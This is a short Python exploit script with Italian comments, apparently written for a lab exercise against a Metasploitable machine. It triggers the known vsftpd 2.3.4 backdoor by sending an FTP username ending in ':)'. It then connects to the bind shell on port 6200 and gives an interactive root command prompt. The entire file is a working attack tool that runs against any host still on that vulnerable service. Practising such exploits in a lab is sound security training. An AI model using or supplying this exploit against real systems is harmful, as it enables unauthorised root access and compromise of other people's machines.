import socket
import time
import os
import sys
import threading

# Configurazione target
target_ip = "192.168.50.3"  # IP della macchina Metasploitable
ftp_port = 21
backdoor_port = 6200

# Connessione FTP per attivare la backdoor
def activate_backdoor():
    print("[*] Connessione al servizio FTP...")
    ftp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ftp_sock.connect((target_ip, ftp_port))

    # Ricezione del banner
    banner = ftp_sock.recv(1024).decode()
    print(f"[+] Banner ricevuto: {banner.strip()}")

    # Invio della backdoor string "USER test:)"
    print("[*] Invio del comando USER per attivare la backdoor...")
    ftp_sock.send(b"USER test:)\r\n")
    time.sleep(0.5)

    # Invio del comando PASS
    ftp_sock.send(b"PASS test\r\n")
    time.sleep(1)
    ftp_sock.close()

# Connessione alla backdoor con prompt persistente
def interactive_shell():
    print("[*] Tentativo di connessione alla backdoor sulla porta 6200...")
    time.sleep(2)

    try:
        backdoor_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_sock.connect((target_ip, backdoor_port))
        print("[+] Connessione alla shell interattiva stabilita!\n")

        username = "root"

        # Funzione per leggere continuamente l'output del target
        def read_from_target():
            while True:
                data = backdoor_sock.recv(4096).decode()
                if not data:
                    break
                # Stampa l'output ricevuto
                sys.stdout.write(data)
                sys.stdout.flush()
                # Mostra di nuovo il prompt dopo l'output
                sys.stdout.write(f"\n{username}@{target_ip} # ")
                sys.stdout.flush()

        # Avvia il thread per ricevere l'output dal target
        thread = threading.Thread(target=read_from_target, daemon=True)
        thread.start()

        # Gestione input dell'utente
        while True:
            try:
                command = input(f"{username}@{target_ip} # ").strip()
                if command.lower() in ['exit', 'quit']:
                    print("[*] Chiusura della connessione...")
                    break
                # Invia il comando al target
                backdoor_sock.send(command.encode() + b"\n")
            except KeyboardInterrupt:
                print("\n[*] Interruzione della connessione...")
                backdoor_sock.close()
                break

    except Exception as e:
        print("[-] Errore durante la connessione alla backdoor:", e)

# Main
if __name__ == "__main__":
    activate_backdoor()
    interactive_shell()
